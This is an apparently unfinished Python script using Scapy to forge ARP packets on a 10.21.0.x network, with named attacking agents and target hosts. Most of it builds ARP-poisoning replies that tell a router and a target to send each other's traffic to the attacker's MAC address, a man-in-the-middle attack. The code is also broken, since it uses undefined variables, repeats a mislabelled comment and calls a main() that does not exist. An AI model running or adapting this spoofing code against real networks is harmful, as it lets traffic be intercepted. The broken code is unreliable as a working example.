import subprocess
import random
import time
import signal
import os
from scapy.all import *
from datetime import datetime, timedelta

run_time_minutes = 10

INTERFACES = ['Melchior', 'Balthasar', 'Casper']
TARGET_INTERFACES = ['Maria', 'Rose', 'Sina']

# Data structure for agents
agents_info = {
    'Melchior': 'F6:91:7F:74:12:F6',
    'Balthasar': 'F2:C7:F1:B6:80:98',
    'Casper': 'B2:DE:93:F3:CD:F8'
}

# Data structure for targets
targets_info = {
    'Maria': {'target_ip':'10.21.0.16','target_mac':'CE:32:51:9F:81:02'},
    'Rose':  {'target_ip':'10.21.0.17','target_mac':'12:45:6C:CD:58:D6'},
    'Sina':  {'target_ip':'10.21.0.18','target_mac':'B2:DA:BF:0C:ED:AB'}
}


def benign_arp_forger(agent_name, target_interface):

    targetip = targets_info[target_interface]['target_ip']
    targetmac = targets_info[target_interface]['target_mac']
    
    arppkt = Ether()/ARP()
    arppkt[ARP].hwsrc = targetmac
    arppkt[ARP].psrc = targetip
    arppkt[ARP].pdst = "10.21.0.5"
    arppkt[Ether].hwdst = "DE:BC:50:A7:AD:9E"
    sendp(arppkt, iface="eth0", verbose=0)
    print(f"{agent_name}sending forged arp packet to {target_interface}")



## WHO IS Router? Tell Target
arppktA = Ether()/ARP()
arppktA[ARP].hwsrc = targetmac
arppktA[ARP].psrc = targetip
arppktA[ARP].pdst = "10.21.0.5"
arppktA[Ether].hwdst = "FF:FF:FF:FF:FF:FF"
arppktA[ARP].op = 1

## WHO IS Target? Tell Router
arppktB = Ether()/ARP()
arppktB[ARP].hwsrc = "DE:BC:50:A7:AD:9E"
arppktB[ARP].psrc = "10.21.0.5" 
arppktB[ARP].pdst = targetip
arppktB[Ether].hwdst = "FF:FF:FF:FF:FF:FF"
arppktB[ARP].op = 1

## Poison Router: Tell the router Target --> US
arppktC = Ether()/ARP()
arppktC[ARP].hwsrc = attacker_mac
arppktC[ARP].psrc = targetip
arppktC[ARP].pdst = "10.21.0.5" 
arppktC[Ether].hwdst = "DE:BC:50:A7:AD:9E"
arppktC[ARP].op = 2

## Poison Router: Tell the router Target --> US
arppktC = Ether()/ARP()
arppktC[ARP].hwsrc = attack_mac
arppktC[ARP].psrc = "10.21.0.5"
arppktC[ARP].pdst = targetip
arppktC[Ether].hwdst = target_mac
arppktC[ARP].op = 2
# Entry point
if __name__ == "__main__":
    main()
